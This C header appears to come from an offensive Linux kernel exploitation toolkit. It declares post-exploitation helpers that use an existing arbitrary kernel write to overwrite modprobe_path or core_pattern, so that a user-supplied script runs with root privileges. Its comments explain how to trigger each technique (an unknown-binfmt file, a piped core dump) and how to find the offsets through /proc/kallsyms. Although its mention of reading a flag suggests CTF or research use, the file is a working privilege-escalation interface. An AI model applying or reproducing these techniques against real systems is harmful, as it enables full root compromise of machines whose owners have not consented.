#ifndef _KPWN_OVERWRITE_
#define _KPWN_OVERWRITE_

#include <stddef.h>
#include <stdint.h>

// Post-exploitation kernel-overwrite targets.
//
// These helpers assume you already have an arbitrary kernel write primitive
// (e.g. from a UAF → type-confusion → controlled write). They take a write
// callback and the target offset from kbase (or absolute address).

// Callback type: write `data` (of `len` bytes) to kernel virtual address `dst`.
// Returns 0 on success, negative on error.
typedef int (*kpwn_kwrite_fn)(void *dst, const void *data, size_t len,
                              void *ctx);

// Overwrite modprobe_path with a user-controlled path (typically a script that
// reads the flag / opens a root shell). Triggers by executing a file with
// unknown binfmt (e.g. "\xff\xff\xff\xff" header), which causes the kernel to
// invoke modprobe_path.
//
// modprobe_path_off: offset of modprobe_path from kbase (find via
//                    `cat /proc/kallsyms | grep modprobe_path`)
// payload_path: path to the script to execute (must be < 256 bytes)
int kpwn_overwrite_modprobe(void *kbase, size_t modprobe_path_off,
                            const char *payload_path, kpwn_kwrite_fn write_fn,
                            void *ctx);

// Trigger modprobe_path execution after overwriting it.
// Creates a dummy file with invalid binfmt header and executes it.
int kpwn_trigger_modprobe(const char *dummy_path);

// Overwrite core_pattern to execute a payload when a process crashes.
// The core_pattern string starts with "|" to pipe the core dump to a program.
//
// core_pattern_off: offset of core_pattern from kbase
// payload_cmd: the command string (e.g. "|/tmp/pwn.sh")
int kpwn_overwrite_core_pattern(void *kbase, size_t core_pattern_off,
                                const char *payload_cmd,
                                kpwn_kwrite_fn write_fn, void *ctx);

#endif
